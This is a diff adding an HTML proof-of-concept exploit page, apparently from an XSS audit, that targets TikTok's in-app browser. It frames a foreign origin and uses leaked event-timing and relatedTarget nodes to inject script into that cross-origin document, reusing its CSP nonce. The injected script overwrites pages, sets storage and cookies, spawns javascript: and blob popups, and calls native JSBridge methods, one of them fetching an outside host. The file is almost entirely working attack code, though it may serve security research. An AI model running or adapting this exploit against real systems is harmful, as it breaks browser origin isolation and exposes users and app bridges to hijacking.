@@ -1,0 +1,788 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TikTok Event Timing child-origin diagnostic</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font: 16px system-ui, sans-serif;
+    background: #101622;
+    color: #eef4ff;
+  }
+  header { padding: 12px 14px; background: #20345d; }
+  header strong { display: block; font-size: 18px; }
+  #status { margin-top: 5px; white-space: pre-wrap; }
+  iframe {
+    display: block;
+    width: 100%;
+    height: calc(100vh - 104px);
+    border: 4px solid #4e78c7;
+    background: white;
+  }
+</style>
+<header>
+  <strong>TikTok Event Timing diagnostic</strong>
+  <div id="instruction">Tap once in the upper half of the framed Example panel.</div>
+  <div id="status">WAITING_FOR_FOREIGN_TARGET</div>
+  <div id="top-bridge" style="font-size:12px"></div>
+</header>
+<iframe id="victim" title="Example.com foreign target"></iframe>
+<script>
+(() => {
+  const query = new URLSearchParams(location.search);
+  const targetKind = query.get('target') || 'example';
+  const handoffNonce = typeof crypto.randomUUID === 'function'
+    ? crypto.randomUUID()
+    : `${Date.now()}-${Math.random().toString(36).slice(2)}`;
+  const storageTargetOrigin =
+    'https://tiktok-event-storage-target.vercel.app';
+  const githubTargetUrl =
+    'https://belubyte.github.io/xss-audit-jianyang/' +
+    'poc/tiktok-event-storage-target/';
+  const targetUrl = targetKind === 'tiktok'
+    ? 'https://www.tiktok.com/legal/page/row/terms-of-service/en?tiktok-event-timing-child=1'
+    : targetKind === 'exampleOrg'
+      ? 'https://example.org/?tiktok-event-timing-child=1'
+    : targetKind === 'storageGithub'
+      ? `${githubTargetUrl}?nonce=${encodeURIComponent(handoffNonce)}`
+    : targetKind === 'storage'
+      ? `${storageTargetOrigin}/?nonce=${encodeURIComponent(handoffNonce)}`
+      : 'https://example.com/?tiktok-event-timing-child=1';
+  const control = location.hash === '#control';
+  const promotionMode = query.get('promote') || '';
+  const bridgeProbe = query.get('bridge') || '';
+  const promoteBlank = promotionMode === 'blank';
+  const status = document.querySelector('#status');
+  const topBridge = document.querySelector('#top-bridge');
+  const seen = new WeakSet();
+  let finished = false;
+  let pending = false;
+
+  function setStatus(value) {
+    status.textContent = value;
+    document.title = value;
+  }
+
+  function updateTopBridge() {
+    const jsBridge = window.JSBridge;
+    topBridge.textContent = [
+      'topAutofillInit=' + Boolean(window.__initAutoFill__),
+      'topJSBridgeCall=' + Boolean(jsBridge && typeof jsBridge.call === 'function'),
+      'topAnole=' + (typeof window.anoleCommonJSB)
+    ].join(' ');
+  }
+  updateTopBridge();
+  setInterval(updateTopBridge, 500);
+
+  function handleTarget(node, label) {
+    if (finished || pending || !node || seen.has(node)) return;
+    if ((promotionMode === 'storagetop'
+         || promotionMode === 'multitabtop')
+        && label !== 'pointerover'
+        && label !== 'pointerdown'
+        && label !== 'click') return;
+    let owner;
+    try {
+      owner = node.ownerDocument;
+    } catch (_) {
+      return;
+    }
+    if (!owner || owner === document) return;
+    seen.add(node);
+
+    if (control) {
+      finished = true;
+      setStatus('MATCHED_CONTROL_DROPPED_FOREIGN_NODE');
+      return;
+    }
+
+    pending = true;
+    setStatus(`FOREIGN_NODE_CANDIDATE:${label}`);
+    try {
+      const script = owner.createElement('script');
+      const nonceSource = owner.querySelector('script[nonce]');
+      if (nonceSource && nonceSource.nonce) script.nonce = nonceSource.nonce;
+      script.textContent = `(() => {
+        const foreignOrigin = location.origin;
+        const foreignUrl = location.href;
+        try {
+          parent.postMessage({
+            type: 'contractgooner-foreign-realm-executed',
+            label: ${JSON.stringify(label)},
+            origin: foreignOrigin
+          }, '*');
+        } catch (_) {}
+        const promotionMode = ${JSON.stringify(promotionMode)};
+        const bridgeProbe = ${JSON.stringify(bridgeProbe)};
+        const storageKey = ${JSON.stringify(`cg_tiktok_event_${handoffNonce}`)};
+        const storageValue = ${JSON.stringify(`PoC_by_ContractGooner:${handoffNonce}`)};
+        const storageCookieName = ${JSON.stringify(`cg_tiktok_event_${handoffNonce.replace(/[^a-z0-9]/gi, '')}`)};
+        let storageHandoff = '';
+        if (promotionMode === 'multitabtop') {
+          const epoch = ${JSON.stringify(handoffNonce)};
+          const report = (stage, details = {}) => {
+            try {
+              parent.postMessage({
+                type: 'contractgooner-multitab-stage',
+                stage,
+                origin: location.origin,
+                ...details
+              }, '*');
+            } catch (_) {}
+          };
+          const popup = window.open(
+            'about:blank',
+            'tiktok_event_multitab_' + epoch.replace(/[^a-z0-9]/gi, '')
+          );
+          if (!popup) {
+            report('popup-returned-null');
+            return;
+          }
+
+          let blankDocument;
+          try {
+            blankDocument = popup.document;
+          } catch (error) {
+            report('blank-document-unreadable', {error: error.name});
+            return;
+          }
+
+          const commitUrl = new URL(foreignUrl);
+          commitUrl.searchParams.set('cg_multitab_epoch', epoch);
+          commitUrl.hash = '';
+          report('blank-opened', {
+            blankOrigin: popup.location.origin,
+            commitUrl: commitUrl.href
+          });
+          try {
+            popup.location.replace(commitUrl.href);
+          } catch (error) {
+            report('navigation-threw', {error: error.name});
+            return;
+          }
+
+          let attempts = 0;
+          let proofWritten = false;
+          const timer = setInterval(() => {
+            attempts++;
+            try {
+              const activeDocument = popup.document;
+              const href = popup.location.href;
+              const activeUrl = new URL(href);
+              const documentUrl = activeDocument.URL;
+              const activeDocumentChanged = activeDocument !== blankDocument;
+              const committed = activeDocumentChanged
+                && activeUrl.protocol === 'https:'
+                && activeUrl.origin === foreignOrigin
+                && activeUrl.searchParams.get('cg_multitab_epoch') === epoch
+                && documentUrl === href
+                && activeDocument.readyState !== 'loading';
+              if (!proofWritten && committed) {
+                proofWritten = true;
+                clearInterval(timer);
+                activeDocument.documentElement.innerHTML =
+                  '<body style="font:22px system-ui;padding:24px">' +
+                  '<h1 id="PoC_by_ContractGooner">PoC_by_ContractGooner</h1>' +
+                  '<p id="foreign-origin"></p><p id="foreign-url"></p>' +
+                  '<p id="foreign-top"></p><p id="document-generation"></p></body>';
+                activeDocument.querySelector('#foreign-origin').textContent =
+                  'origin=' + popup.location.origin;
+                activeDocument.querySelector('#foreign-url').textContent =
+                  'url=' + popup.location.href;
+                activeDocument.querySelector('#foreign-top').textContent =
+                  'top=' + (popup === popup.top) + ' opener=' + Boolean(popup.opener);
+                activeDocument.querySelector('#document-generation').textContent =
+                  'activeDocumentChanged=' + activeDocumentChanged +
+                  ' document.URL=' + activeDocument.URL;
+                activeDocument.title =
+                  'PoC_by_ContractGooner ' + popup.location.origin;
+                report('https-document-written', {
+                  href: popup.location.href,
+                  documentUrl: activeDocument.URL,
+                  activeDocumentChanged,
+                  top: popup === popup.top,
+                  opener: Boolean(popup.opener)
+                });
+                popup.alert(popup.location.origin);
+              }
+            } catch (_) {}
+            if (attempts > 150 && !proofWritten) {
+              clearInterval(timer);
+              report('no-committed-same-origin-document-after-15000ms');
+            }
+          }, 100);
+          return;
+        }
+        if (promotionMode === 'storagetop') {
+          window.__cgEventProof = storageValue;
+          storageHandoff = 'foreign-realm-proof-set';
+          try {
+            localStorage.setItem(storageKey, storageValue);
+            storageHandoff += ';localStorage-set';
+          } catch (error) {
+            storageHandoff += ';localStorage-' + error.name;
+          }
+          try {
+            document.cookie = storageCookieName + '='
+              + encodeURIComponent(storageValue)
+              + '; Path=/; Max-Age=120; SameSite=None; Secure';
+            storageHandoff += ';cookie-attempted';
+          } catch (error) {
+            storageHandoff += ';cookie-' + error.name;
+          }
+          const targetStatus = document.querySelector('#status');
+          if (targetStatus) {
+            targetStatus.textContent = 'FOREIGN_REALM_NONCE_ARMED';
+          }
+          document.title = 'FOREIGN_REALM_NONCE_ARMED';
+          return;
+        }
+        const bridgeNames = [
+          'ToutiaoJSBridge', 'JSBridge', 'BDXBridge', '__TTHYBRIDXHR',
+          'anoleCommonJSB', 'ReactNativeWebView', 'webkit', 'Android'
+        ];
+        const bridgeSummary = bridgeNames.map(name => {
+          let value;
+          try { value = window[name]; } catch (_) { return name + ':blocked'; }
+          const type = typeof value;
+          if ((type !== 'object' || value === null) && type !== 'function') {
+            return name + ':' + type;
+          }
+          let keys = [];
+          try { keys = Object.getOwnPropertyNames(value).slice(0, 24); } catch (_) {}
+          return name + ':' + type + '[' + keys.join(',') + ']';
+        }).join('\\n');
+        document.documentElement.innerHTML =
+          '<body style="font:22px system-ui;padding:24px">' +
+          '<h1 id="PoC_by_ContractGooner">PoC_by_ContractGooner</h1>' +
+          '<p id="foreign-origin"></p>' +
+          '<pre id="bridge-summary" style="font-size:12px;white-space:pre-wrap"></pre></body>';
+        document.querySelector('#foreign-origin').textContent =
+          'origin=' + location.origin;
+        document.querySelector('#bridge-summary').textContent = bridgeSummary;
+        document.title = 'PoC_by_ContractGooner ' + location.origin;
+        if (bridgeProbe === 'tthSafe') {
+          let result = 'bridge-missing';
+          try {
+            if (window.__TTHYBRIDXHR
+                && typeof window.__TTHYBRIDXHR.postMessage === 'function') {
+              result = String(window.__TTHYBRIDXHR.postMessage(JSON.stringify({
+                id: 'contractgooner-event-frame-safe-control',
+                method: 'GET',
+                url: 'https://chrome-amber-one.vercel.app/?tth-safe-control=1',
+                data: '',
+                headers: {}
+              })));
+            }
+          } catch (error) {
+            result = 'throw:' + error.name;
+          }
+          document.querySelector('#bridge-summary').textContent =
+            bridgeSummary + '\\n\\nTTH_SAFE_RESULT=' + result;
+          document.title = 'TTH_SAFE_' + result;
+          return;
+        }
+        if (bridgeProbe === 'bdxXGetAppInfo'
+            && window.BDXBridge
+            && typeof window.BDXBridge._invokeMethod === 'function') {
+          const callbackId = 'contractgooner-bdx-xgetappinfo';
+          let bdxFinished = false;
+          const finishBdx = (label, raw) => {
+            if (bdxFinished) return;
+            bdxFinished = true;
+            let value = raw;
+            if (typeof value === 'string') {
+              try { value = JSON.parse(value); } catch (_) {}
+            }
+            const params = value && typeof value === 'object'
+              ? value.__params
+              : null;
+            const code = params && typeof params.code === 'number'
+              ? params.code
+              : 'absent';
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\n' + label + ':code=' + code
+              + ' messageKeys=' + (value && typeof value === 'object'
+                ? Object.keys(value).slice(0, 32).join(',') : '')
+              + ' paramsKeys=' + (params && typeof params === 'object'
+                ? Object.keys(params).slice(0, 32).join(',') : '');
+            document.title = label + '_code_' + code;
+          };
+          window.addEventListener('message', event => {
+            const value = event.data;
+            if (value && typeof value === 'object'
+                && value.__callback_id === callbackId) {
+              finishBdx('BDX_CALLBACK', value);
+            }
+          });
+          try {
+            window.BDXBridge._invokeMethod(JSON.stringify({
+              __msg_type: 'call',
+              func: 'x.getAppInfo',
+              params: {},
+              JSSDK: '4.0',
+              __callback_id: callbackId,
+              __iframe_url: location.href
+            }));
+            setTimeout(() => finishBdx('BDX_NO_CALLBACK', null), 3000);
+          } catch (error) {
+            finishBdx('BDX_THROW_' + error.name, null);
+          }
+          return;
+        }
+        if (bridgeProbe === 'proxyAnoleHttps') {
+          const target = 'https://example.com/?tiktok-proxy-anole-control=1';
+          try {
+            parent.postMessage({
+              event_name: 'iframe_to_jsb',
+              jsbName: 'anoleCommonJSB',
+              msg: {
+                event: 'sendMessage',
+                business: 'iab',
+                scene: 'ads-format',
+                scenario: 'navigateInCurrentIAB',
+                params: {
+                  method: 'navigateInCurrentIAB',
+                  url: target
+                }
+              }
+            }, '*');
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\nPROXY_ANOLE_HTTPS_SENT=' + target;
+            document.title = 'PROXY_ANOLE_HTTPS_SENT';
+          } catch (error) {
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\nPROXY_ANOLE_THROW=' + error.name;
+            document.title = 'PROXY_ANOLE_THROW_' + error.name;
+          }
+          return;
+        }
+        if (bridgeProbe === 'proxyXOpenHttps') {
+          const schema =
+            'aweme://webview?url=https%3A%2F%2Fexample.com%2Frobots.txt&use_spark=1';
+          try {
+            parent.postMessage({
+              event_name: 'iframe_to_jsb',
+              jsbName: 'x.open',
+              msg: {
+                event: 'sendMessage',
+                schema,
+                params: {method: 'x.open'}
+              }
+            }, '*');
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\nPROXY_XOPEN_HTTPS_SENT=' + schema;
+            document.title = 'PROXY_XOPEN_HTTPS_SENT';
+          } catch (error) {
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\nPROXY_XOPEN_THROW=' + error.name;
+            document.title = 'PROXY_XOPEN_THROW_' + error.name;
+          }
+          return;
+        }
+        if ((bridgeProbe === 'wrapperAppInfo'
+             || bridgeProbe === 'wrapperXGetAppInfo')
+            && window.ToutiaoJSBridge
+            && typeof window.ToutiaoJSBridge.call === 'function') {
+          let wrapperFinished = false;
+          const finishWrapper = (label, raw) => {
+            if (wrapperFinished) return;
+            wrapperFinished = true;
+            const value = raw && typeof raw === 'object' ? raw : {};
+            const code = typeof value.code === 'number' ? value.code : 'absent';
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\n' + label + ':code=' + code
+              + ' keys=' + Object.keys(value).slice(0, 32).join(',');
+            document.title = label + '_code_' + code;
+          };
+          try {
+            const wrapperMethod = bridgeProbe === 'wrapperXGetAppInfo'
+              ? 'x.getAppInfo'
+              : 'appInfo';
+            window.ToutiaoJSBridge.call(wrapperMethod, {}, result => {
+              finishWrapper('WRAPPER_CALLBACK', result);
+            });
+            setTimeout(() => finishWrapper('WRAPPER_NO_CALLBACK', {}), 3000);
+          } catch (error) {
+            finishWrapper('WRAPPER_THROW_' + error.name, {});
+          }
+          return;
+        }
+        if (bridgeProbe === 'appInfo' && window.ToutiaoJSBridge
+            && typeof window.ToutiaoJSBridge.invokeMethod === 'function') {
+          const callbackId = 'cg_event_frame_appinfo';
+          let bridgeFinished = false;
+          const finishBridge = message => {
+            if (bridgeFinished) return;
+            bridgeFinished = true;
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\n' + message;
+            document.title = 'FRAME_BRIDGE_' + message.split(':')[0];
+          };
+          const summarize = raw => {
+            let data = raw;
+            if (typeof data === 'string') {
+              try { data = JSON.parse(data); } catch (_) {}
+            }
+            if (!data || typeof data !== 'object'
+                || data.__callback_id !== callbackId) return;
+            const params = data.__params;
+            const paramsKeys = params && typeof params === 'object'
+              ? Object.keys(params).slice(0, 32)
+              : [];
+            const code = params && typeof params.code === 'number'
+              ? params.code
+              : 'absent';
+            finishBridge(
+              'CALLBACK:code=' + code
+              + ' messageKeys=' + Object.keys(data).join(',')
+              + ' paramsKeys=' + paramsKeys.join(',')
+            );
+          };
+          window.addEventListener('message', event => summarize(event.data));
+          window.ToutiaoJSBridge._handleMessageFromToutiao = summarize;
+          try {
+            window.ToutiaoJSBridge.invokeMethod(JSON.stringify({
+              __msg_type: 'call',
+              func: 'appInfo',
+              params: '{}',
+              JSSDK: '1',
+              namespace: '',
+              __callback_id: callbackId,
+              __iframe_url: location.href
+            }));
+            setTimeout(() => finishBridge('NO_CALLBACK_AFTER_3000MS'), 3000);
+          } catch (error) {
+            finishBridge('INVOKE_THROW:' + error.name);
+          }
+          return;
+        }
+        if (bridgeProbe === 'pipoOpenWebView' && window.ToutiaoJSBridge
+            && typeof window.ToutiaoJSBridge.invokeMethod === 'function') {
+          const callbackId = 'cg_pipo_open_webview';
+          const target = 'https://example.org/?tiktok-pipo-open-webview=1';
+          let pipoFinished = false;
+          const finishPipo = raw => {
+            if (pipoFinished) return;
+            pipoFinished = true;
+            let value = raw;
+            if (typeof value === 'string') {
+              try { value = JSON.parse(value); } catch (_) {}
+            }
+            const params = value && typeof value === 'object'
+              ? value.__params
+              : null;
+            const code = params && typeof params.code === 'number'
+              ? params.code
+              : 'absent';
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\nPIPO_OPEN_CALLBACK_CODE=' + code;
+            document.title = 'PIPO_OPEN_CALLBACK_' + code;
+          };
+          window.addEventListener('message', event => {
+            const value = event.data;
+            if (value && typeof value === 'object'
+                && value.__callback_id === callbackId) {
+              finishPipo(value);
+            }
+          });
+          window.ToutiaoJSBridge._handleMessageFromToutiao = value => {
+            if (value && value.__callback_id === callbackId) finishPipo(value);
+          };
+          try {
+            window.ToutiaoJSBridge.invokeMethod(JSON.stringify({
+              __msg_type: 'call',
+              func: 'pipo.openWebView',
+              params: JSON.stringify({url: target}),
+              JSSDK: '1',
+              namespace: '',
+              __callback_id: callbackId,
+              __iframe_url: location.href
+            }));
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\nPIPO_OPEN_SENT=' + target;
+            document.title = 'PIPO_OPEN_SENT';
+            setTimeout(() => finishPipo(null), 3000);
+          } catch (error) {
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\nPIPO_OPEN_THROW=' + error.name;
+            document.title = 'PIPO_OPEN_THROW_' + error.name;
+          }
+          return;
+        }
+        if (promotionMode === 'popup') {
+          const popup = window.open(
+            foreignUrl,
+            'tiktok_event_target_' + Math.random().toString(36).slice(2)
+          );
+          if (!popup) {
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\nPOPUP_RETURNED_NULL';
+            document.title = 'POPUP_RETURNED_NULL';
+            return;
+          }
+          let attempts = 0;
+          const timer = setInterval(() => {
+            attempts++;
+            try {
+              if (popup.location.protocol === 'https:'
+                  && popup.location.origin === foreignOrigin) {
+                popup.document.documentElement.innerHTML =
+                  '<body style="font:22px system-ui;padding:24px">' +
+                  '<h1 id="PoC_by_ContractGooner">PoC_by_ContractGooner</h1>' +
+                  '<p id="foreign-origin"></p><p id="foreign-top"></p></body>';
+                popup.document.querySelector('#foreign-origin').textContent =
+                  'origin=' + popup.location.origin;
+                popup.document.querySelector('#foreign-top').textContent =
+                  'top=' + (popup === popup.top) + ' url=' + popup.location.href;
+                popup.document.title =
+                  'POPUP_TOP_' + popup.location.origin + '_' + (popup === popup.top);
+                popup.alert(popup.location.origin);
+                clearInterval(timer);
+              }
+            } catch (_) {}
+            if (attempts > 100) {
+              clearInterval(timer);
+              document.querySelector('#bridge-summary').textContent =
+                bridgeSummary + '\\n\\nPOPUP_NO_SAME_ORIGIN_AFTER_10000MS';
+              document.title = 'POPUP_NO_SAME_ORIGIN';
+            }
+          }, 100);
+          return;
+        }
+        if (promotionMode === 'popuprace') {
+          const popup = window.open(
+            foreignUrl,
+            'tiktok_event_race_' + Math.random().toString(36).slice(2)
+          );
+          if (!popup) {
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\nPOPUPRACE_RETURNED_NULL';
+            document.title = 'POPUPRACE_RETURNED_NULL';
+            return;
+          }
+          const raceCode = [
+            "document.documentElement.innerHTML='<body style=\\"font:22px system-ui;padding:24px\\"><h1 id=\\"PoC_by_ContractGooner\\">PoC_by_ContractGooner</h1><p id=\\"foreign-origin\\"></p></body>'",
+            "document.querySelector('#foreign-origin').textContent='origin='+location.origin+' top='+(window===top)+' race=popup-location'",
+            "document.title='POPUPRACE_'+location.origin+'_top_'+(window===top)",
+            "alert(location.origin)"
+          ].join(';');
+          const javascriptUrl = 'javascript:' + encodeURIComponent(raceCode);
+          const outcomes = [];
+          [250, 1000, 2500, 5000, 8000].forEach(delay => {
+            setTimeout(() => {
+              try {
+                popup.location.href = javascriptUrl;
+                outcomes.push(delay + ':assigned');
+              } catch (error) {
+                outcomes.push(delay + ':throw-' + error.name);
+              }
+              document.querySelector('#bridge-summary').textContent =
+                bridgeSummary + '\\n\\nPOPUPRACE=' + outcomes.join(',');
+              document.title = 'POPUPRACE_' + outcomes.join('_');
+            }, delay);
+          });
+          return;
+        }
+        if (promotionMode === 'blobtop'
+            || promotionMode === 'blobnav'
+            || promotionMode === 'blobpopup') {
+          const blobHandler = [
+            "document.querySelector('#foreign-origin').textContent='origin='+location.origin+' top='+(window===top)+' carrier=blob'",
+            "try{history.replaceState(null,'','https://example.com/?tiktok-event-timing-blobtop=1')}catch(error){}",
+            "document.querySelector('#foreign-url').textContent='url='+location.href",
+            "document.title='BLOBTOP_'+location.origin+'_top_'+(window===top)",
+            "alert(location.origin)"
+          ].join(';');
+          const blobHtml =
+            '<!doctype html><meta charset="utf-8">' +
+            '<body style="font:22px system-ui;padding:24px">' +
+            '<h1 id="PoC_by_ContractGooner">PoC_by_ContractGooner</h1>' +
+            '<p id="foreign-origin"></p><p id="foreign-url"></p>' +
+            '<img hidden src="x" onerror=' + JSON.stringify(blobHandler) + '>';
+          const blobUrl = URL.createObjectURL(
+            new Blob([blobHtml], {type: 'text/html'})
+          );
+          if (promotionMode === 'blobpopup') {
+            const popup = window.open(
+              blobUrl,
+              'tiktok_event_blob_' + Math.random().toString(36).slice(2)
+            );
+            if (!popup) {
+              document.querySelector('#bridge-summary').textContent =
+                bridgeSummary + '\\n\\nBLOBPOPUP_RETURNED_NULL';
+              document.title = 'BLOBPOPUP_RETURNED_NULL';
+            }
+          } else if (promotionMode === 'blobnav') {
+            try {
+              top.location.href = blobUrl;
+              document.querySelector('#bridge-summary').textContent =
+                bridgeSummary + '\\n\\nBLOBNAV_REQUESTED';
+              document.title = 'BLOBNAV_REQUESTED';
+            } catch (error) {
+              document.querySelector('#bridge-summary').textContent =
+                bridgeSummary + '\\n\\nBLOBNAV_THROW:' + error.name;
+              document.title = 'BLOBNAV_THROW_' + error.name;
+            }
+          } else {
+            const promoted = window.open(blobUrl, '_top');
+            if (!promoted) {
+              document.querySelector('#bridge-summary').textContent =
+                bridgeSummary + '\\n\\nBLOBTOP_RETURNED_NULL';
+              document.title = 'BLOBTOP_RETURNED_NULL';
+            }
+          }
+          return;
+        }
+        if (promotionMode === 'jspopup') {
+          const popupCode = [
+            "document.documentElement.innerHTML='<body style=\\"font:22px system-ui;padding:24px\\"><h1 id=\\"PoC_by_ContractGooner\\">PoC_by_ContractGooner</h1><p id=\\"foreign-origin\\"></p></body>'",
+            "document.querySelector('#foreign-origin').textContent='origin='+location.origin+' top='+(window===top)",
+            "document.title='JSPOPUP_'+location.origin+'_top_'+(window===top)",
+            "alert(location.origin)"
+          ].join(';');
+          const popup = window.open(
+            'javascript:' + encodeURIComponent(popupCode),
+            'tiktok_event_javascript_popup'
+          );
+          if (!popup) {
+            document.querySelector('#bridge-summary').textContent =
+              bridgeSummary + '\\n\\nJSPOPUP_RETURNED_NULL';
+            document.title = 'JSPOPUP_RETURNED_NULL';
+          }
+          return;
+        }
+        if (promotionMode === 'topblank') {
+          try {
+            const promoted = window.open('about:blank', '_top');
+            promoted.document.documentElement.innerHTML =
+              '<body style="font:22px system-ui;padding:24px">' +
+              '<h1 id="PoC_by_ContractGooner">PoC_by_ContractGooner</h1>' +
+              '<p id="foreign-origin">origin=' + promoted.location.origin + '</p></body>';
+            promoted.history.replaceState(null, '', foreignUrl);
+            promoted.document.title =
+              'PoC_by_ContractGooner ' + promoted.location.origin;
+            promoted.alert(promoted.location.origin);
+            return;
+          } catch (error) {
+            document.querySelector('#foreign-origin').textContent =
+              'TOPBLANK_FAILED:' + error.name + ' origin=' + location.origin;
+          }
+        }
+        if (${promoteBlank ? 'true' : 'false'}) {
+          const popup = window.open(
+            'about:blank',
+            'tiktok_event_blank_' + Math.random().toString(36).slice(2)
+          );
+          if (popup) {
+            try {
+              popup.document.documentElement.innerHTML =
+                '<h1>INHERITED_BLANK_' + foreignOrigin + '</h1>';
+              popup.location.href = foreignUrl;
+              let attempts = 0;
+              const timer = setInterval(() => {
+                attempts++;
+                try {
+                  if (popup.location.protocol === 'https:'
+                      && popup.location.origin === foreignOrigin) {
+                    popup.document.documentElement.innerHTML =
+                      '<body style="font:22px system-ui;padding:24px">' +
+                      '<h1 id="PoC_by_ContractGooner">PoC_by_ContractGooner</h1>' +
+                      '<p id="foreign-origin">origin=' + popup.location.origin + '</p></body>';
+                    popup.document.title =
+                      'PoC_by_ContractGooner ' + popup.location.origin;
+                    popup.alert(popup.location.origin);
+                    clearInterval(timer);
+                  }
+                } catch (_) {}
+                if (attempts > 100) clearInterval(timer);
+              }, 100);
+              return;
+            } catch (_) {}
+          }
+        }
+        alert(location.origin);
+      })()`;
+      window.__cgForeignCandidate = {
+        label,
+        ownerUrl: owner.URL,
+        ownerDefaultViewIsVictim:
+          owner.defaultView === document.querySelector('#victim').contentWindow,
+        ownerDocumentElementConnected: Boolean(
+          owner.documentElement && owner.documentElement.isConnected
+        ),
+        generatedScriptLength: script.textContent.length
+      };
+      (owner.head || owner.documentElement).appendChild(script);
+      window.__cgForeignCandidate.scriptConnected = script.isConnected;
+      setTimeout(() => {
+        if (!finished) pending = false;
+      }, 1000);
+    } catch (error) {
+      pending = false;
+      setStatus(`FOREIGN_MUTATION_FAILED:${error.name}:${error.message}`);
+    }
+  }
+
+  window.addEventListener('message', event => {
+    const data = event.data;
+    const victimWindow = document.querySelector('#victim').contentWindow;
+    if (event.source !== victimWindow || !data) return;
+    if (data.type === 'contractgooner-foreign-realm-executed') {
+      finished = true;
+      pending = false;
+      setStatus(`FOREIGN_NODE_EXPOSED:${data.label}`);
+      return;
+    }
+    if (data.type === 'contractgooner-multitab-stage') {
+      const expectedOrigin = new URL(targetUrl).origin;
+      if (event.origin !== expectedOrigin || data.origin !== expectedOrigin) {
+        setStatus('MULTITAB_STAGE_REJECTED_ORIGIN');
+        return;
+      }
+      window.__cgMultitabProof = {
+        sourceIsVictim: event.source === victimWindow,
+        eventOrigin: event.origin,
+        ...data
+      };
+      setStatus(`MULTITAB_${data.stage}:${event.origin}`);
+    }
+  });
+
+  for (const type of [
+    'pointerover', 'pointerout', 'pointerenter', 'pointerleave',
+    'mouseover', 'mouseout', 'mouseenter', 'mouseleave',
+    'focusin', 'focusout'
+  ]) {
+    document.addEventListener(type, event => {
+      let related = null;
+      try { related = event.relatedTarget; } catch (_) {}
+      if (related) handleTarget(related, `${type}.relatedTarget`);
+    }, true);
+  }
+
+  if (!('PerformanceObserver' in window)
+      || !PerformanceObserver.supportedEntryTypes.includes('event')) {
+    setStatus('EVENT_TIMING_UNAVAILABLE');
+  } else {
+    const observer = new PerformanceObserver(list => {
+      for (const entry of list.getEntries()) {
+        let target = null;
+        try { target = entry.target; } catch (_) {}
+        if (target) handleTarget(target, entry.name);
+      }
+    });
+    observer.observe({type: 'event', buffered: true, durationThreshold: 16});
+  }
+
+  document.querySelector('#victim').src = targetUrl;
+  const deadline = performance.now() + (bridgeProbe ? 60000 : 20000);
+  const stress = () => {
+    const sliceEnd = performance.now() + 24;
+    while (performance.now() < sliceEnd) {}
+    if (performance.now() < deadline && !finished) requestAnimationFrame(stress);
+  };
+  requestAnimationFrame(stress);
+})();
+</script>
